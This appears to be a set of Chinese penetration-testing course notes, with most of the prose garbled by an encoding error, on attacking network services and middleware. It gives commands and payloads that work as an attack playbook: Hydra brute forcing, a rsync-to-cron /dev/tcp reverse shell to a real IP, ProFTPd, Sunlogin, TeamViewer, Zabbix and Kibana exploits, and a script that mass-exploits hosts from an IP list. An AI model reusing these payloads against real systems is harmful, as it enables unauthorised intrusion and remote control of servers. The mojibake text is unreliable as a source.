<h4 id="å£ä»¤çŒœè§£-Hydra-FTP-RDP-SSH"><a href="#å£ä»¤çŒœè§£-Hydra-FTP-RDP-SSH" class="headerlink" title="å£ä»¤çŒœè§£-Hydra-FTP&amp;RDP&amp;SSH"></a><strong>å£ä»¤çŒœè§£-Hydra-FTP&amp;RDP&amp;SSH</strong></h4><p><a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a></p>
<p>hydraæ˜¯ä¸€ä¸ªè‡ªåŠ¨åŒ–çš„çˆ†ç ´å·¥å…·ï¼Œæš´åŠ›ç ´è§£å¼±å¯†ç ï¼Œ  ä¹Ÿæ˜¯ä¹‹å‰ç¬¬52å¤©è®²åˆ°è¿‡çš„å·¥å…·äº†è¿™ä¸ªæ˜¯ã€‚<br>æ˜¯ä¸€ä¸ªæ”¯æŒä¼—å¤šåè®®çš„çˆ†ç ´å·¥å…·ï¼Œå·²ç»é›†æˆåˆ°KaliLinuxä¸­ï¼Œç›´æ¥åœ¨ç»ˆç«¯æ‰“å¼€å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-l login å°å†™ï¼ŒæŒ‡å®šç”¨æˆ·åè¿›è¡Œç ´è§£</span><br><span class="line">-L file å¤§å†™ï¼ŒæŒ‡å®šç”¨æˆ·çš„ç”¨æˆ·åå­—å…¸</span><br><span class="line">-p pass å°å†™ï¼Œç”¨äºæŒ‡å®šå¯†ç ç ´è§£ï¼Œå¾ˆå°‘ä½¿ç”¨ï¼Œä¸€èˆ¬é‡‡ç”¨å¯†ç å­—å…¸ã€‚</span><br><span class="line">-P file å¤§å†™ï¼Œç”¨äºæŒ‡å®šå¯†ç å­—å…¸ã€‚</span><br><span class="line">-Cä½¿ç”¨å†’å·åˆ†å‰²æ ¼å¼ï¼Œä¾‹å¦‚â€œç™»å½•å:å¯†ç â€æ¥ä»£æ›¿ -L/-P å‚æ•°</span><br><span class="line">-e ns é¢å¤–çš„é€‰é¡¹ï¼Œnï¼šç©ºå¯†ç è¯•æ¢ï¼Œsï¼šä½¿ç”¨æŒ‡å®šè´¦æˆ·å’Œå¯†ç è¯•æ¢</span><br><span class="line">-M file æŒ‡å®šç›®æ ‡ipåˆ—è¡¨æ–‡ä»¶ï¼Œæ‰¹é‡ç ´è§£ã€‚</span><br><span class="line">-o file æŒ‡å®šç»“æœè¾“å‡ºæ–‡ä»¶</span><br><span class="line">-f æ‰¾åˆ°ç¬¬ä¸€å¯¹ç™»å½•åæˆ–è€…å¯†ç çš„æ—¶å€™ä¸­æ­¢ç ´è§£ã€‚</span><br><span class="line">-t tasks åŒæ—¶è¿è¡Œçš„çº¿ç¨‹æ•°ï¼Œé»˜è®¤æ˜¯16</span><br><span class="line">-Så¤§å†™ï¼Œé‡‡ç”¨SSLé“¾æ¥</span><br><span class="line">-s PORT æŒ‡å®šé»˜è®¤ç«¯å£</span><br><span class="line">-w time è®¾ç½®æœ€å¤§è¶…æ—¶æ—¶é—´ï¼Œå•ä½</span><br><span class="line">-v / -V æ˜¾ç¤ºè¯¦ç»†è¿‡ç¨‹</span><br><span class="line">-R æ¢å¤çˆ†ç ´ï¼ˆå¦‚æœç ´è§£ä¸­æ–­äº†ï¼Œä¸‹æ¬¡æ‰§è¡Œ hydra -R /path/to/hydra.restore å°±å¯ä»¥ç»§ç»­ä»»åŠ¡ã€‚ï¼‰</span><br><span class="line">-x è‡ªå®šä¹‰å¯†ç ã€‚</span><br></pre></td></tr></table></figure>

<h4 id="é…ç½®ä¸å½“-æœªæˆæƒè®¿é—®-Rsyncæ–‡ä»¶å¤‡ä»½"><a href="#é…ç½®ä¸å½“-æœªæˆæƒè®¿é—®-Rsyncæ–‡ä»¶å¤‡ä»½" class="headerlink" title="é…ç½®ä¸å½“-æœªæˆæƒè®¿é—®-Rsyncæ–‡ä»¶å¤‡ä»½"></a>é…ç½®ä¸å½“-æœªæˆæƒè®¿é—®-Rsyncæ–‡ä»¶å¤‡ä»½</h4><p>rsyncæ˜¯Linuxä¸‹ä¸€æ¬¾æ•°æ®å¤‡ä»½å·¥å…·ï¼Œæ”¯æŒé€šè¿‡rSncåè®®ã€sshåè®®è¿›è¡Œè¿œç¨‹æ–‡ä»¶ä¼ è¾“ã€‚å…¶<br>ä¸­rsynctåè®®é»˜è®¤ç›‘å¬873ç«¯å£ï¼Œå¦‚æœç›®æ ‡å¼€å¯äº†rsyncæœåŠ¡ï¼Œå¹¶ä¸”æ²¡æœ‰é…ç½®ACLæˆ–è®¿é—®å¯†<br>ç ï¼Œæˆ‘ä»¬å°†å¯ä»¥è¯»å†™ç›®æ ‡æœåŠ¡å™¨æ–‡ä»¶ã€‚<br>åˆ¤æ–­ï¼šrsync rsync:âˆ¥123.58.236.76:45854&#x2F;<br>åˆ©ç”¨ï¼š<br>-è¯»å–æ–‡ä»¶ï¼šrsync rsync:&#x2F;123.58.236.76:45854&#x2F;src&#x2F;<br>-ä¸‹è½½æ–‡ä»¶ï¼šrsync rsync:&#x2F;123.58.236.76.45854&#x2F;src&#x2F;etc&#x2F;passwd&#x2F;<br>-ä¸Šä¼ æ–‡ä»¶ï¼šrsync-av passwd rsync:&#x2F;123.58.236.76:45854&#x2F;src&#x2F;tmp&#x2F;passwd<br>åå¼¹shell:<br>1ã€è·å–ä¿¡æ¯ï¼š<br>rsync rsync:&#x2F;&#x2F;123.58.236.76:12177&#x2F;src&#x2F;etc&#x2F;crontab &#x2F;root&#x2F;cron.txt<br>2.åˆ›å»ºæ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch shell</span><br><span class="line">#!/bin/bash</span><br><span class="line">/bin/bash-i&gt;&amp;/dev/tcp/47.94.236.117/55660&gt;&amp;1</span><br><span class="line">chmod +x shell</span><br></pre></td></tr></table></figure>

<p>3ã€ä¸Šä¼ æ–‡ä»¶<br>rsync -av shell rsync:&#x2F;&#x2F;123.58.236.76:12177&#x2F;src&#x2F;etc&#x2F;cron.hourly<br>4ã€ç­‰å¾…æ¥å—åå¼¹</p>
<h4 id="é«˜ç«¯è¯¾ç¨‹-ç›´æ¥æœå“ˆ-MSF-Fofaviewer"><a href="#é«˜ç«¯è¯¾ç¨‹-ç›´æ¥æœå“ˆ-MSF-Fofaviewer" class="headerlink" title="é«˜ç«¯è¯¾ç¨‹-ç›´æ¥æœå“ˆ-MSF&amp;Fofaviewer"></a>é«˜ç«¯è¯¾ç¨‹-ç›´æ¥æœå“ˆ-MSF&amp;Fofaviewer</h4><p><a href="https://github.com/wgpsec/fofa_viewer">https://github.com/wgpsec/fofa_viewer</a><br>msfconsole<br>use auxiliary&#x2F;scanner&#x2F;rsync&#x2F;modules_list<br>set rhosts file:&#x2F;root&#x2F;ips.txt<br>set threads 10<br>run<br>æ€è·¯ï¼šä½¿ç”¨fofaæŸ¥è¯¢ç«¯å£ä¸º873çš„èµ„äº§ï¼Œä½¿ç”¨msfæ‰¹é‡æ‰«æç›®çš„èµ„äº§</p>
<h4 id="åè®®æ¼åŒ-åº”ç”¨è½¯ä»¶-FTP-Proftpdæ­å»º"><a href="#åè®®æ¼åŒ-åº”ç”¨è½¯ä»¶-FTP-Proftpdæ­å»º" class="headerlink" title="åè®®æ¼åŒ-åº”ç”¨è½¯ä»¶-FTP&amp;Proftpdæ­å»º"></a>åè®®æ¼åŒ-åº”ç”¨è½¯ä»¶-FTP&amp;Proftpdæ­å»º</h4><p><a href="https://github.com/tokx/exploit-CVE-2015-3306">https://github.com/tokx/exploit-CVE-2015-3306</a><br>python exploit.py â€“host 123.58.236.76â€“port 24967â€“path â€œ&#x2F;var&#x2F;www&#x2F;html&#x2F;â€<br><a href="http://123:58.236:76.19758/backdoorphp?cmd=id">http://123:58.236:76.19758/backdoorphp?cmd=id</a></p>
<h4 id="åè®®æ¼æ´-åº”ç”¨è½¯ä»¶-SSH-libssh-Openssh"><a href="#åè®®æ¼æ´-åº”ç”¨è½¯ä»¶-SSH-libssh-Openssh" class="headerlink" title="åè®®æ¼æ´-åº”ç”¨è½¯ä»¶-SSH&amp;libssh&amp;Openssh"></a>åè®®æ¼æ´-åº”ç”¨è½¯ä»¶-SSH&amp;libssh&amp;Openssh</h4><p>openssh CVE-2014-0160CVE-2018-15473cve202015778<br>CVE-2014-0160ç‰ˆæœ¬å¾ˆå°‘<br>cve_2020_15778ä»·å€¼ä¸é«˜ï¼ˆéœ€è¦æ™®é€šç”¨æˆ·è´¦å·å¯†ç ï¼Œå¯ä»¥è¿”å›shellä½†æ˜¯æƒé™ä»æ˜¯æ™®é€šç”¨æˆ·ï¼‰<br>ç¯å¢ƒæ•ˆæœï¼šä¸å¯ä»¥sshè¿æ¥ï¼Œå¯ä»¥ä½¿ç”¨scp</p>
<p>CVE-2018-15473-ç”¨æˆ·åæšä¸¾<br><a href="https://github.com/Rhynorater/CVE-2018-15473-Exploit">https://github.com/Rhynorater/CVE-2018-15473-Exploit</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install-r requirements.txt</span><br><span class="line">pip3 install paramiko==2.4.1</span><br><span class="line">python sshUsernameEnumExploit.py â€“port 32013 â€“userList examplelnput.txt</span><br><span class="line">123.58.236.76</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬58å¤©-æœåŠ¡æ”»é˜²-åº”ç”¨åè®®-è®¾å¤‡Kibana-Zabbix-è¿œæ§å‘æ—¥è‘µ-VNC-TV"><a href="#ç¬¬58å¤©-æœåŠ¡æ”»é˜²-åº”ç”¨åè®®-è®¾å¤‡Kibana-Zabbix-è¿œæ§å‘æ—¥è‘µ-VNC-TV" class="headerlink" title="ç¬¬58å¤© æœåŠ¡æ”»é˜²-åº”ç”¨åè®®&amp;è®¾å¤‡Kibana&amp;Zabbix&amp;è¿œæ§å‘æ—¥è‘µ&amp;VNC&amp;TV"></a>ç¬¬58å¤© æœåŠ¡æ”»é˜²-åº”ç”¨åè®®&amp;è®¾å¤‡Kibana&amp;Zabbix&amp;è¿œæ§å‘æ—¥è‘µ&amp;VNC&amp;TV</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-38"><a href="#çŸ¥è¯†ç‚¹ï¼š-38" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€è¿œç¨‹æ§åˆ¶ç¬¬ä¸‰æ–¹åº”ç”¨å®‰å…¨<br>2ã€ä¸‰æ–¹åº”ç”¨-å‘æ—¥è‘µ&amp;VNC&amp;TV<br>3ã€è®¾å¤‡å¹³å°-Zabbix&amp;Kibanaiæ¼æ´</p>
<h4 id="ç« èŠ‚å†…å®¹ï¼š-4"><a href="#ç« èŠ‚å†…å®¹ï¼š-4" class="headerlink" title="ç« èŠ‚å†…å®¹ï¼š"></a>ç« èŠ‚å†…å®¹ï¼š</h4><p>å¸¸è§ç‰ˆåŠ¡åº”ç”¨çš„å®‰å…¨æµ‹è¯•ï¼š<br>1ã€é…ç½®ä¸å½“-æœªæˆæƒè®¿é—®<br>2ã€å®‰å…¨æœºåˆ¶ç‰¹å®šå®‰å…¨æ¼æ´<br>3ã€å®‰å…¨æœºåˆ¶-å¼±å£ä»¤ä¾µç ´æ”»å‡»</p>
<h4 id="å‰ç½®çŸ¥è¯†ï¼š-7"><a href="#å‰ç½®çŸ¥è¯†ï¼š-7" class="headerlink" title="å‰ç½®çŸ¥è¯†ï¼š"></a>å‰ç½®çŸ¥è¯†ï¼š</h4><p>åº”ç”¨æœåŠ¡å®‰å…¨æµ‹è¯•æµç¨‹ï¼šè§å›¾<br>1ã€åˆ¤æ–­æœåŠ¡å¼€æ”¾æƒ…å†µ-ç«¯å£æ‰«æ&amp;ç»„åˆåº”ç”¨ç­‰<br>2ã€åˆ¤æ–­æœåŠ¡ç±»å‹å½’å±æ•°æ®åº“&amp;æ–‡ä»¶ä¼ è¾“&amp;é€šè®¯ç­‰<br>3ã€åˆ¤æ–­æœåŠ¡åˆ©ç”¨æ–¹å¼ç‰¹å®šæ¼æ´8æœªæˆæƒ&amp;å¼±å£ä»¤ç­‰</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-34"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-34" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>è¿œç¨‹æ§åˆ¶-å‘æ—¥è‘µ&amp;Vnc&amp;Teamviewer<br>è®¾å¤‡å¹³å°-Zabbix-CVE-2022-23131<br>è®¾å¤‡å¹³å°-Kibana-CVE-2019-7609</p>
<h4 id="è¿œç¨‹æ§åˆ¶-å‘æ—¥è‘µ-Vnc-Teamviewer"><a href="#è¿œç¨‹æ§åˆ¶-å‘æ—¥è‘µ-Vnc-Teamviewer" class="headerlink" title="è¿œç¨‹æ§åˆ¶-å‘æ—¥è‘µ&amp;Vnc&amp;Teamviewer"></a>è¿œç¨‹æ§åˆ¶-å‘æ—¥è‘µ&amp;Vnc&amp;Teamviewer</h4><p>-å‘æ—¥è‘µRCE</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/Mr-xn/sunlogin_rce</span><br><span class="line">xrkRce.exe -h 192.168.46.157 -t scan</span><br><span class="line">xrkRce.exe -h 192.168.46.157-t rce-p 49712-c â€œipconfigâ€</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‘½ä»¤è¯´æ˜ï¼š</span><br><span class="line">-h æŒ‡å®šç›®æ ‡</span><br><span class="line">-t é€‰æ‹©æ‰«ææˆ–è€…å‘½ä»¤æ‰§è¡Œ é»˜è®¤scan</span><br><span class="line">-p è®¾ç½®æ‰«æç«¯å£èŒƒå›´ é»˜è®¤4wåˆ°65535</span><br><span class="line">-c éœ€è¦æ‰§è¡Œçš„å‘½ä»¤</span><br></pre></td></tr></table></figure>

<p>-VNCå£ä»¤é—®é¢˜&amp;æœªæˆæƒ<br>MSFå†…ç½®å£ä»¤åŠæœªæˆæƒæµ‹è¯•</p>
<p>-Teamviewer</p>
<blockquote>
<p>éœ€è¦æ»¡è¶³äº®ç‚¹ä¸¤ç‚¹ï¼š1ã€ä¸»æœºå®‰è£…Teamviewer 2ã€ç®¡ç†å‘˜ç‚¹å‡»è®¿é—®æ„é€ å¥½çš„é“¾æ¥</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IDOCTYPE</span> <span class="attr">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">stitle&gt;cv2020-13699/itle&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Welcome to xiaodil<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">&quot;height:1px;width:1px;&quot;</span><span class="attr">src</span>=<span class="string">&#x27;teamviewer10:--play Wattacker-</span></span></span><br><span class="line"><span class="string"><span class="tag">IP\sharelfake.tvs&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="è®¾å¤‡å¹³å°-Zabbix-CVE-2022-23131"><a href="#è®¾å¤‡å¹³å°-Zabbix-CVE-2022-23131" class="headerlink" title="è®¾å¤‡å¹³å°-Zabbix-CVE-2022-23131"></a>è®¾å¤‡å¹³å°-Zabbix-CVE-2022-23131</h4><p>Zabbiâ…¸æ˜¯ç”±Alexei Vladishevå¼€å‘çš„ä¸€ç§ç½‘ç»œç›‘è§†ã€ç®¡ç†ç³»ç»Ÿï¼ŒåŸºäºServer-Clientæ¶æ„ã€‚<br>æ˜¯ä¸€æ¬¾æœåŠ¡å™¨ç›‘æ§è½¯ä»¶ï¼Œå…¶ç”±serverã€.agentã€,webç­‰æ¨¡å—ç»„æˆï¼Œå…¶ä¸­webæ¨¡å—ç”±PHPç¼–<br>å†™ï¼Œç”¨æ¥æ˜¾ç¤ºæ•°æ®åº“ä¸­çš„ç»“æœã€‚é»˜è®¤ç«¯å£ï¼š10051çº¢<br>Zabbix CVE-2022-23131ç™»å½•ç»•è¿‡æ¼æ´å¤ç°<br><a href="https://github.com/LOading-x/cve-2022-23131">https://github.com/LOading-x/cve-2022-23131</a><br>python3 zabbix.py target Admin<br>ç„¶åä¿®æ”¹Cookie,ä½¿ç”¨samlç™»å½•å³å¯<br>CVE-2017-2824CVE-2020-11800</p>
<p>è·å–æƒé™åç»­åˆ©ç”¨ï¼š1ã€æ·»åŠ åå¼¹shellè„šæœ¬â€“2ã€æœåŠ¡å™¨æ‰§è¡Œè„šæœ¬â€“3ã€è·å–æœåŠ¡å™¨æƒé™</p>
<p>æ·»åŠ åå¼¹shellè„šæœ¬</p>
<p>æ‰¾åˆ°æœåŠ¡å™¨é…ç½®å¤„</p>
<p>è¿è¡Œè„šæœ¬</p>
<h4 id="è®¾å¤‡å¹³å°-Kibana-CVE-2019-7609"><a href="#è®¾å¤‡å¹³å°-Kibana-CVE-2019-7609" class="headerlink" title="è®¾å¤‡å¹³å°-Kibana-CVE-2019-7609"></a>è®¾å¤‡å¹³å°-Kibana-CVE-2019-7609</h4><p>Kibanaiä¸ºElassticsearchè®¾è®¡çš„ä¸€æ¬¾å¼€æºçš„è§†å›¾å·¥å…·ã€‚å…¶5.6.15å’Œ6.6.1ä¹‹å‰çš„ç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€<br>å¤„åŸå‹é“¾æ±¡æŸ“æ¼æ´ï¼Œåˆ©ç”¨æ³¥æ´å¯ä»¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚é»˜è®¤ç«¯å£ï¼š5601<br><a href="https://github.com/LandGrey/CVE-2019-7609">https://github.com/LandGrey/CVE-2019-7609</a><br>es(*).props(label._proto_env.AAAA&#x3D;â€˜require(â€œchild_processâ€).exec(â€œ&#x2F;bin&#x2F;touch<br>&#x2F;tmp&#x2F;successâ€):process.exitï¼ˆï¼‰&#x2F;&#x2F;).props(label._proto.env.NODE_OPTIONS&#x3D;â€™â€“require<br>&#x2F;proc&#x2F;self&#x2F;environâ€™)</p>
<p>è„šæœ¬æ‰¹é‡æ¢æµ‹</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;ips.txt&#x27;</span>);</span><br><span class="line">	ip=ip.strip() <span class="comment">#æ¢è¡Œç¬¦</span></span><br><span class="line">	cmdline=<span class="string">&#x27;D:\python2.7\python.exe CVE-2019-7605-kibana-rce.py -u %s -host 41.94.236.117 -port 5566 --shell&#x27;</span> %ip</span><br><span class="line">	os.system(cmdline)</span><br></pre></td></tr></table></figure>

<h1 id="ç¬¬59å¤©-æœåŠ¡æ”»é˜²-ä¸­é—´ä»¶å®‰å…¨-CVEå¤ç°-lS-Apache-Tomcata-Nginx"><a href="#ç¬¬59å¤©-æœåŠ¡æ”»é˜²-ä¸­é—´ä»¶å®‰å…¨-CVEå¤ç°-lS-Apache-Tomcata-Nginx" class="headerlink" title="ç¬¬59å¤© æœåŠ¡æ”»é˜²-ä¸­é—´ä»¶å®‰å…¨&amp;CVEå¤ç°&amp;lS&amp;Apache&amp;Tomcata&amp;Nginx"></a>ç¬¬59å¤© æœåŠ¡æ”»é˜²-ä¸­é—´ä»¶å®‰å…¨&amp;CVEå¤ç°&amp;lS&amp;Apache&amp;Tomcata&amp;Nginx</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-39"><a href="#çŸ¥è¯†ç‚¹ï¼š-39" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>ä¸­é—´ä»¶åŠæ¡†æ¶åˆ—è¡¨ï¼š<br>lIS,Apache,Nginx,Tomcat,Docker,Weblogic,JBoos,WebSphere,Jenkins,<br>GlassFish,Jira,Struts2,Laravel,Solr,Shiro,Thinkphp,Sprng,Flask,jQuery<br>1ã€ä¸­é—´ä»¶-IISçŸ­æ–‡ä»¶&amp;è§£æ&amp;è“å±ç­‰<br>2ã€ä¸­é—´ä»¶-Nginx-æ–‡ä»¶è§£æ&amp;å‘½ä»¤æ‰§è¡Œç­‰<br>3ã€ä¸­é—´ä»¶-Apache-RCE&amp;ç›®å½•éå†&amp;æ–‡ä»¶è§£æç­‰<br>4ã€ä¸­é—´ä»¶-Tomcat-å¼±å£ä»¤&amp;æ–‡ä»¶ä¸Šä¼ &amp;æ–‡ä»¶åŒ…å«ç­‰</p>
<h4 id="ç« èŠ‚å†…å®¹ï¼š-5"><a href="#ç« èŠ‚å†…å®¹ï¼š-5" class="headerlink" title="ç« èŠ‚å†…å®¹ï¼š"></a>ç« èŠ‚å†…å®¹ï¼š</h4><p>å¸¸è§ä¸­é—´ä»¶çš„å®‰å…¨æµ‹è¯•ï¼š<br>1ã€é…ç½®ä¸å½“-è§£æ&amp;å¼±å£ä»¤<br>2ã€å®‰å…¨æœºåˆ¶ç‰¹å®šå®‰å…¨æ¼æ´<br>3ã€å®‰å…¨æœºåˆ¶-å¼±å£ä»¤çˆ†ç ´æ”»å‡»<br>4ã€å®‰å…¨åº”ç”¨æ¡†æ¶ç‰¹å®šå®‰å…¨æ¼æ´</p>
<h4 id="å‰ç½®çŸ¥è¯†ï¼š-8"><a href="#å‰ç½®çŸ¥è¯†ï¼š-8" class="headerlink" title="å‰ç½®çŸ¥è¯†ï¼š"></a>å‰ç½®çŸ¥è¯†ï¼š</h4><p>ä¸­é—´ä»¶å®‰å…¨ä¾§è¯•æµç¨‹ï¼š<br>1ã€åˆ¤æ–­ä¸­é—´ä»¶ä¿¡æ¯åç§°&amp;ç‰ˆæœ¬&amp;ä¸‰æ–¹<br>2ã€åˆ¤æ–­ä»²é—´ä»¶é—®é¢˜-é…ç½®ä¸å½“&amp;å…¬å¼€æ¼æ´<br>3ã€åˆ¤æ–­ä¸­é—´ä»¶åˆ©ç”¨-å¼±å£ä»¤&amp;EXP&amp;æ¡†æ¶æ¼æ´<br>åº”ç”¨æœåŠ¡å®‰å…¨æµ‹è¯•æµç¨‹ï¼šè§å›¾<br>1ã€åˆ¤æ–­æœåŠ¡å¼€æ”¾æƒ…å†µç«¯å£æ‰«æ&amp;ç»„åˆåº”ç”¨ç­‰<br>2ã€åˆ¤æ–­æœåŠ¡ç±»å‹å½’å±æ•°æ®åº“&amp;æ–‡ä»¶ä¼ è¾“&amp;é€šè®¯ç­‰<br>3ã€åˆ¤æ–­æœåŠ¡åˆ©ç”¨æ–¹å¼æŒå®šæ¼æ´&amp;æœªæˆæƒ&amp;å¼±å£ä»¤ç­‰</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-35"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-35" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>ä¸­é—´ä»¶IIS-çŸ­æ–‡ä»¶&amp;è§£æ&amp;è“å±ç­‰<br>ä¸­é—´ä»¶-Nginx-æ–‡ä»¶è§£æ&amp;å‘½ä»¤æ‰§è¡Œç­‰<br>ä¸­é—´ä»¶-Apache-RCE&amp;ç›®å½•éå†&amp;æ–‡ä»¶è§£æç­‰<br>ä¸­é—´ä»¶ã€‚Tomcat-å¼±å£ä»¤&amp;æ–‡ä»¶ä¸Šä¼ &amp;æ–‡ä»¶åŒ…å«ç­‰<br>ä¸­é—´ä»¶-Apache RCE&amp;Fofa Viewer-èµ°å‘é«˜ç«¯å•Š</p>
<h4 id="ä¸­é—´ä»¶IISçŸ­æ–‡ä»¶-è§£æ-è“å±ç­‰"><a href="#ä¸­é—´ä»¶IISçŸ­æ–‡ä»¶-è§£æ-è“å±ç­‰" class="headerlink" title="ä¸­é—´ä»¶IISçŸ­æ–‡ä»¶&amp;è§£æ&amp;è“å±ç­‰"></a>ä¸­é—´ä»¶IISçŸ­æ–‡ä»¶&amp;è§£æ&amp;è“å±ç­‰</h4><blockquote>
<p>Internet Information Servicesï¼ˆIISï¼Œä»¥å‰ç§°ä¸ºInternet Information Serverï¼‰äº’è”ç½‘ä¿¡æ¯æœåŠ¡æ˜¯Microsoftå…¬å¸æä¾›çš„å¯æ‰©å±•WebæœåŠ¡å™¨ï¼Œæ”¯æŒHTTPï¼ŒHTTP&#x2F;2ï¼ŒHTTPSï¼ŒFTPï¼ŒFTPSï¼ŒSMTPå’ŒNNTPç­‰ã€‚èµ·åˆç”¨äºWindows NTç³»åˆ—ï¼Œéšåå†…ç½®åœ¨Windows 2000ã€Windows XP Professionalã€Windows Server 2003å’Œåç»­ç‰ˆæœ¬ä¸€èµ·å‘è¡Œï¼Œä½†åœ¨Windows XP Homeç‰ˆæœ¬ä¸Šå¹¶æ²¡æœ‰IISã€‚IISç›®å‰åªé€‚ç”¨äºWindowsç³»ç»Ÿï¼Œä¸é€‚ç”¨äºå…¶ä»–æ“ä½œç³»ç»Ÿã€‚</p>
</blockquote>
<p>1ã€çŸ­æ–‡ä»¶ï¼šä¿¡æ¯æ”¶é›† å‚è€ƒé“¾æ¥ï¼š<a href="https://www.freebuf.com/articles/web/172561.html">https://www.freebuf.com/articles/web/172561.html</a><br>2ã€æ–‡ä»¶è§£æï¼šè¿˜æœ‰ç‚¹ç”¨<br>3ã€HTTP.SYS:è“å±å´©æºƒ<br>4ã€CVE-2017-7269æ¡ä»¶è¿‡è€<br>å…¶ä»–IISæ¼æ´å‚è€ƒï¼š<a href="https://blog.csdn.net/qq_52486507/article/details/129863950">https://blog.csdn.net/qq_52486507/article/details/129863950</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IISæ˜¯Windowsä¸Šçš„ä¸€ä¸ªä¸­é—´ä»¶ï¼Œç°åœ¨ç”¨åˆ°çš„å·²ç»ç®—æ˜¯æ¯”è¾ƒå°‘çš„äº†ã€‚</span><br></pre></td></tr></table></figure>

<h4 id="ä¸­é—´ä»¶-Nginx-æ–‡ä»¶è§£æ-å‘½ä»¤æ‰§è¡Œç­‰"><a href="#ä¸­é—´ä»¶-Nginx-æ–‡ä»¶è§£æ-å‘½ä»¤æ‰§è¡Œç­‰" class="headerlink" title="ä¸­é—´ä»¶-Nginx-æ–‡ä»¶è§£æ&amp;å‘½ä»¤æ‰§è¡Œç­‰"></a>ä¸­é—´ä»¶-Nginx-æ–‡ä»¶è§£æ&amp;å‘½ä»¤æ‰§è¡Œç­‰</h4><p>vulhubå¼€å¯ç¯å¢ƒ</p>
<p>ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶â€“é€šè¿‡burpåœ¨æ–‡ä»¶ä¸­åŠ å…¥phpinfo()è¯­å¥</p>
<p>è®¿é—®å›¾ç‰‡ï¼Œåœ¨å›¾ç‰‡åé¢åŠ ä¸Š &#x2F;.phpè¯­å¥è¢«æˆåŠŸè§£æå¹¶æ‰§è¡Œï¼š</p>
<p>å¯åˆ©ç”¨æ­¤æ¥ä¸Šä¼ æœ¨é©¬ï¼Œä»è€Œè¿›è¡Œgetshell<br>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬</p>
<p>ä½¿ç”¨hackbaræ‰§è¡Œphpinfo();</p>
<h4 id="Nginx-æ–‡ä»¶åé€»è¾‘æ¼æ´"><a href="#Nginx-æ–‡ä»¶åé€»è¾‘æ¼æ´" class="headerlink" title="Nginx æ–‡ä»¶åé€»è¾‘æ¼æ´"></a>Nginx æ–‡ä»¶åé€»è¾‘æ¼æ´</h4><p>æ¼æ´åŸç†ï¼š</p>
<blockquote>
<p>ä¸»è¦åŸå› æ˜¯é”™è¯¯åœ°è§£æäº†è¯·æ±‚çš„URIï¼Œé”™è¯¯åœ°è·å–åˆ°ç”¨æˆ·è¯·æ±‚çš„æ–‡ä»¶åï¼Œå¯¼è‡´å‡ºç°æƒé™ç»•è¿‡ã€ä»£ç æ‰§è¡Œçš„è¿å¸¦å½±å“ã€‚</p>
</blockquote>
<p>vulhubå¯åŠ¨ç¯å¢ƒï¼š</p>
<p>ä¸Šä¼ gifå›¾ç‰‡æ–‡ä»¶ï¼Œé€šè¿‡burpæŠ“åŒ…æ’å…¥pnpinfo();<br>ç„¶ååœ¨æ–‡ä»¶ååç¼€åŠ å…¥ç©ºæ ¼</p>
<p>å†ç”¨è¿‡æµè§ˆå™¨è®¿é—®ä¸Šä¼ å›¾ç‰‡åè¿”å›çš„æ–‡ä»¶è·¯å¾„ï¼Œå› ä¸ºåœ¨æ–‡ä»¶åååŠ äº†ç©ºæ ¼æ‰€ä»¥ç›´æ¥è®¿é—®ä¸åˆ°<br>å†æŠ“åŒ…åœ¨æ–‡ä»¶åååŠ ä¸¤ä¸ªç©ºæ ¼å’Œ.php(&#x2F;uploadfiles&#x2F;1.jpg )â€“ç„¶åä¿®æ”¹ç©ºæ ¼16è¿›åˆ¶ä¸º00</p>
<p>æœ€åè¿”å›PHP infoå†…å®¹</p>
